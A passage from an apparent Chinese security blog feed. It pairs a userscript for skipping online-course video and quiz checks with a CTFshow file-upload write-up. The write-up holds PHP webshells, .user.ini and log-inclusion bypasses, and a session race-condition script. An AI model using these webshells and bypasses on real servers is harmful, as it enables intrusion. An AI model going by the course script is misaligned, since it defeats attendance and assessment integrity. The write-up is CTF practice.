        <content type="html"><![CDATA[<blockquote><p>前言：BYD智慧树嘎嘎刷视频，1.5倍速太浪费时间了，通过查看前端代码发现了一种逃课方法。可以通过修改播放器的倍速播放功能来实现加速播放效果。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         智慧树16倍速自动脚本</span></span><br><span class="line"><span class="comment">// @namespace    http://natro92.github.io</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  自动修改脚本倍速x1.5-&gt;x16</span></span><br><span class="line"><span class="comment">// @author       natro92</span></span><br><span class="line"><span class="comment">// @match        *://*.zhihuishu.com/*</span></span><br><span class="line"><span class="comment">// @icon         https://www.google.com/s2/favicons?sz=64&amp;domain=zhihuishu.com</span></span><br><span class="line"><span class="comment">// @grant        GM_log</span></span><br><span class="line"><span class="comment">// @require      https://code.jquery.com/jquery-2.1.4.min.js</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">changeSpeed</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">GM_log</span>(<span class="string">&quot;change speeed begins!&quot;</span>);</span><br><span class="line">  <span class="comment">//0 - 1.0 | 1 - 1.25 | 2 - 1.5</span></span><br><span class="line">  <span class="keyword">var</span> speed2 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab15&quot;</span>);</span><br><span class="line">  speed2.<span class="title function_">setAttribute</span>(<span class="string">&quot;rate&quot;</span>,<span class="string">&quot;16.0&quot;</span>);</span><br><span class="line">  speed2.<span class="property">innerHTML</span> = <span class="string">&quot;X 16.0&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> speed1 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab10&quot;</span>);</span><br><span class="line">  speed1.<span class="title function_">setAttribute</span>(<span class="string">&quot;rate&quot;</span>,<span class="string">&quot;8.0&quot;</span>);</span><br><span class="line">  speed1.<span class="property">innerHTML</span> = <span class="string">&quot;X 8.0&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> speed0 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab05&quot;</span>);</span><br><span class="line">  speed0.<span class="title function_">setAttribute</span>(<span class="string">&quot;rate&quot;</span>,<span class="string">&quot;4.0&quot;</span>);</span><br><span class="line">  speed0.<span class="property">innerHTML</span> = <span class="string">&quot;X 4.0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="comment">//修改播放器的倍速值</span></span><br><span class="line">  <span class="title function_">GM_log</span>(<span class="string">&quot;Hello World！&quot;</span>);</span><br><span class="line">  <span class="comment">// 修改value属性</span></span><br><span class="line">  <span class="comment">// var speed = document.getElementsByClassName(&#x27;speedTab15&#x27;)[0];</span></span><br><span class="line">  <span class="comment">// console.log(speed.innerHTML);</span></span><br><span class="line">  <span class="comment">// speed.setAttribute(&#x27;rate&#x27;,&#x27;16.0&#x27;);</span></span><br><span class="line">  <span class="comment">// speed.innerHTML = &quot;X 16.0&quot;;</span></span><br><span class="line">  <span class="comment">// setTimeout(function()&#123;</span></span><br><span class="line">  <span class="comment">//     changeSpeed();</span></span><br><span class="line">  <span class="comment">// &#125;, 5000);</span></span><br><span class="line">  <span class="comment">// byd傻逼智慧树一秒渲染完成不了，延迟五秒加载、</span></span><br><span class="line">  <span class="comment">// 等待页面渲染成功之后修改</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">changeSpeed</span>();</span><br><span class="line">    <span class="comment">//模拟点击，自动修改倍速</span></span><br><span class="line">    <span class="comment">//这个不行，会检测到脚本问题</span></span><br><span class="line">    <span class="comment">// var e = document.createEvent(&quot;MouseEvents&quot;);</span></span><br><span class="line">    <span class="comment">// e.initEvent(&quot;click&quot;, true, true);</span></span><br><span class="line">    <span class="comment">// document.querySelector(&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab05&quot;).dispatchEvent(e);</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="title function_">GM_log</span>(<span class="string">&quot;Finished yet！&quot;</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>但是这样只做到了修改默认页面的倍速栏，但是想要修改其他的页面的却做不到。</p><p>除此之外，智慧树有脚本检测，因此模拟点击无法使用了。<br>经过抓包发现，修改倍速写在了前端中，暂停时会有时长保存，可以尝试其他方式来达到修改。<br>基础功能已经实现了，下一步就是播放检测。<br>当暂停状态下id（路径：<code>document.querySelector(&quot;#playButton&quot;)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684912224706-9e4ffb01-c67b-4d25-aff7-479a2237a766.png" alt="image.png"><br>播放时：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684912271465-fafa5847-3a00-4b59-b21f-53901e2b6346.png" alt="image.png"><br>检测播放写完了，下面就是勾吧弹窗的问题了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684913986235-680c6439-096a-4bda-abe9-f340b71de737.png" alt="image.png"><br>位置：<code>document.querySelector(&quot;#playTopic-dialog &gt; div&quot;)</code><br>我们要点击其中的选择按钮，再提交。才行<br>想法有两个<br>第一个是选择错误之后选择一个一个尝试直到弹框消失，第二个是选择错误之后检测正确答案，提交正确答案。<br>返回正常页面时发现，弹框不是隐藏的，而是有题目新创建一个。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684916243149-df686aec-b7f0-444d-8f8f-628c6b8e22f2.png" alt="image.png"><br>搞了下别人的账号，用了一下发现答案在没答的时候不会分发，html处是注释。<br>直接提交正确答案：<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__body &gt; div &gt; div.el-scrollbar__wrap &gt; div &gt; div &gt; div.radio &gt; div &gt; p &gt; span&quot;)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684916770084-1ff9abd9-728a-4952-bf9d-bbdd0c631d73.png" alt="image.png"><br>有个选中和未选中<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__body &gt; div &gt; div.el-scrollbar__wrap &gt; div &gt; div &gt; div.radio &gt; ul &gt; li:nth-child(1) &gt; div:nth-child(1) &gt; svg &gt; use&quot;)</code><br>中的href值从<code>#iconxuan</code>转变为<code>#iconxuanzhong</code><br>并且点击关闭按钮继续。<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__footer &gt; span &gt; div&quot;)</code><br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__header &gt; button &gt; i&quot;)</code></p><p><code>#playTopic-dialog &gt; div &gt; div.el-dialog__footer &gt; span &gt; div</code><br>勾吧弹窗推出没调好，还得调。<br>先搁置了，等过段时间，出新的刷课视频的时候接着搞。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
            <tag> Tampermonkey </tag>
            
            <tag> Shortcut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web151-web170文件上传篇</title>
      <link href="/2023/07/09/web151-web170%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/"/>
      <url>/2023/07/09/web151-web170%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="web151、web152"><a href="#web151、web152" class="headerlink" title="web151、web152"></a>web151、web152</h1><h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><p>根据提示，检验写在了前端。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">layui.<span class="keyword">use</span>(<span class="string">&#x27;upload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> upload = layui.upload;</span><br><span class="line">   </span><br><span class="line">  <span class="comment">//执行实例</span></span><br><span class="line">  <span class="keyword">var</span> uploadInst = upload.<span class="title function_ invoke__">render</span>(&#123;</span><br><span class="line">    <span class="attr">elem</span>: <span class="string">&#x27;#upload&#x27;</span> //绑定元素</span><br><span class="line">    ,<span class="attr">url</span>: <span class="string">&#x27;/upload/&#x27;</span> //上传接口</span><br><span class="line">    ,<span class="attr">done</span>: function(res)&#123;</span><br><span class="line">    <span class="keyword">if</span>(res.code==<span class="number">0</span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#result&quot;</span>).<span class="title function_ invoke__">html</span>(<span class="string">&quot;文件上传成功，路径：&quot;</span>+res.msg);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#result&quot;</span>).<span class="title function_ invoke__">html</span>(<span class="string">&quot;文件上传失败，失败原因：&quot;</span>+res.msg);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    ,error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      $(<span class="string">&quot;#result&quot;</span>).<span class="title function_ invoke__">html</span>(<span class="string">&quot;文件上传失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>检测写在前端了，写入php一句话木马，修改后缀为png。上传并抓包。修改文件后缀为需要的php后缀，并访问所需目录：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688402955857-f686aac1-0654-4ed7-917d-cfca7ddd6fce.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688402971003-055c2997-e4ed-4ed8-9305-7289cd1bee30.png" alt="image.png"><br>payload：GET：<code>?1=system(&#39;tac ../flag.php&#39;);</code></p><h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><blockquote><p><a href="https://www.dazhuanlan.com/vip_mmles/topics/1547397">https://www.dazhuanlan.com/vip_mmles/topics/1547397</a> userini</p></blockquote><h3 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h3><p>whatweb指纹识别，发现是nginx，而且在upload页面下发现index.php文件。而且很容易上传如php5,phtml等类型文件，但是不解析，需要上传.user.ini，使文件解析。<br>.user.ini里面可以写：让所有文件都包含该文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688404601489-6ec09a2c-4a79-4083-b328-5d72e5cb6763.png" alt="image.png"><br>然后再上传图片马或者直接上传一句话木马文本即可。<br>上传1.txt内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_GET</span>[<span class="number">1</span>])(<span class="variable">$_GET</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>然后访问upload/index.php并传入payload即可：<br><code>upload/index.php?1=system&amp;2=tac ../fla*</code></p><h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>同153上传.user.ini 然后上传图片马。<br>在前面一题的基础上增加了内容过滤,过滤了php , 可以用大小写来绕过。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688405318328-4eb99034-670a-4fe6-ac18-e23af1e2451d.png" alt="image.png"><br>payload同上题目即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688405482171-89b0dee7-b7a0-4359-b477-396cfe446689.png" alt="image.png"></p><h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p>上传彻底禁用了php 大小写都不行。<br>还是先上传.user.ini 然后使用短标签，建议使用&lt;?=短标签即可<br>短标签：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span> <span class="comment">//short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span>  等价于 <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span> <span class="comment">//无限制</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt; <span class="comment">//asp_tags=on php_version &lt; 7</span></span><br><span class="line">&lt;script language=”php”&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="comment">//php_vsesion &lt; 7</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.png：<code>&lt;?=system($_GET[1]);</code><br>payload:<code>upload/index.php?1=phpinfo&amp;2=tac ../f*</code></p><h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>经过测试过滤了[ ,可以用{}代替[],其它的步骤和前面几个一致<br>1.png : <code>&lt;?=system($_GET&#123;1&#125;);</code></p><h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>又过滤了;和{<br>1.png <code>&lt;?=(system(&#39;nl ../*.ph*&#39;))?&gt;</code><br>注意使用方式可以省略分号，</p><h1 id="web158、web159"><a href="#web158、web159" class="headerlink" title="web158、web159"></a>web158、web159</h1><p>1.png <code>&lt;?=</code>tac ../f*<code>?&gt;</code></p><h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>这题将空格和``反引号和log过滤掉了，所以上传的时候要注意略过多余的空格，log可以用点号拼接绕过，且本题不能使用上题的方法。<br>nginx的日志文件在/var/log/nginx/access.log里</p><p>注意这次的.user.ini文件内容是：<br><code>auto_prepend_file=1.png</code>需要将等号两端空格删除<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688446683068-0bcfe710-e681-4a91-aa17-840a2c552880.png" alt="image.png">1.png <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code><br>按照wp这种写法 会发现提示格式错误。<br>经过查询资料发现，正确的写法应该是：<br>将include和地址中间加一个换行。<br>先用1标记一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447711896-937e1a62-fa1a-4d66-a9f2-ae783d511c8a.png" alt="image.png"><br>切换到hex部分<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447786035-2cd193c2-79dd-437c-955c-bf878c13b927.png" alt="image.png"><br>将1改为0d即可上传成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447819911-82544bdd-ea96-40a4-93d5-39096e9badf1.png" alt="image.png"><br>直接访问即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688448270283-a83e5567-2d1c-4f82-9ee1-50e690b068d3.png" alt="image.png"> </p><h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><h3 id="图片头"><a href="#图片头" class="headerlink" title="图片头"></a>图片头</h3><p>加上图片头：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89A</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688480295049-d3bc1e6b-07ae-4e94-99d2-a3445fcc1b94.png" alt="image.png"><br>图片马同理<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688480375207-109baf2b-5e1b-47b9-93ae-a86cc031df77.png" alt="image.png"><br>UA传入一句话木马。</p><h1 id="web162、web163（远程文件包含-这里不复现了-条件竞争需要后半夜-挺不住）"><a href="#web162、web163（远程文件包含-这里不复现了-条件竞争需要后半夜-挺不住）" class="headerlink" title="web162、web163（远程文件包含 这里不复现了 条件竞争需要后半夜 挺不住）"></a>web162、web163（远程文件包含 这里不复现了 条件竞争需要后半夜 挺不住）</h1><p>过滤了<code>.</code>，所以不能利用日志包含了，先正常上传.user.ini<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688481049862-c54f9e2a-74b3-40c2-a695-f853daba81d5.png" alt="image.png"></p><h2 id="方法一-远程文件包含"><a href="#方法一-远程文件包含" class="headerlink" title="方法一 远程文件包含"></a>方法一 远程文件包含</h2><p>因为不能有.所以将IP转换为十进制，然后修改默认为一句话木马。也就是：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688481931827-fd1cc178-4590-4fa9-a4a5-c2f8c1e80c9d.png" alt="image.png"><br>这里由于需要修改默认页面过于麻烦，这里就没有复现。</p><h2 id="方法二-session条件竞争"><a href="#方法二-session条件竞争" class="headerlink" title="方法二 session条件竞争"></a>方法二 session条件竞争</h2><p>利用session.upload_progress将木马写入session文件，然后包含这个session文件。<br>首先在.user.ini包含/tmp/sess_test</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 20.12.5 13:52</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;ctf&quot;</span>: <span class="string">&quot;/tmp/sess_test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>: <span class="string">&#x27;system(&quot;tac ../f*&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">write</span>(session):</span><br><span class="line">    <span class="keyword">while</span> event.<span class="title function_ invoke__">isSet</span>():</span><br><span class="line">        f = io.<span class="title function_ invoke__">BytesIO</span>(b<span class="string">&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;http://73c8baa3-fd27-4ce6-90d6-107d6eb00f5b.challenge.ctf.show/&#x27;</span>,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">read</span>(session):</span><br><span class="line">    <span class="keyword">while</span> event.<span class="title function_ invoke__">isSet</span>():</span><br><span class="line">        res = session.<span class="title function_ invoke__">post</span>(</span><br><span class="line">            <span class="string">&#x27;http://73c8baa3-fd27-4ce6-90d6-107d6eb00f5b.challenge.ctf.show/&#x27;</span>,</span><br><span class="line">            data=data</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> in res.text:</span><br><span class="line">            <span class="keyword">print</span>(res.text)</span><br><span class="line">            event.<span class="title function_ invoke__">clear</span>()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.<span class="title function_ invoke__">Event</span>()</span><br><span class="line">    event.<span class="title function_ invoke__">set</span>()</span><br><span class="line">    with requests.<span class="title function_ invoke__">session</span>() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            threading.<span class="title function_ invoke__">Thread</span>(target=write, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            threading.<span class="title function_ invoke__">Thread</span>(target=read, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是不知道为什么一直也竞争不到。<br>应该是线程的原因，他这个竞争条件只有后半夜才开放。这里就不复现了。</p><h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>使用生成图片马：<br><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a><br>使用命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python generate.py -m php -o <span class="number">1</span>.png</span><br></pre></td></tr></table></figure><p>生成的图片文本内容会出现：<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code><br>对应传值。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688889962772-0ebf85cd-590f-41dc-88d7-5d5554df2bf9.png" alt="image.png"><br>下载图片，以文本的格式打开就会发现内容。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688890006709-fa1d6252-3631-4a0a-bd11-062d0f875536.png" alt="image.png"></p><h1 id="web165（傻逼库一直导不进去）"><a href="#web165（傻逼库一直导不进去）" class="headerlink" title="web165（傻逼库一直导不进去）"></a>web165（傻逼库一直导不进去）</h1><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>这次图片上传之后会被二次渲染。<br>可以先将图片渲染一张，然后再写入木马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688890383585-00cf1a9c-19b5-4f12-bafc-08a45e71214b.png" alt="image.png"><br>二次渲染之后写入木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">2) Save the processed image and 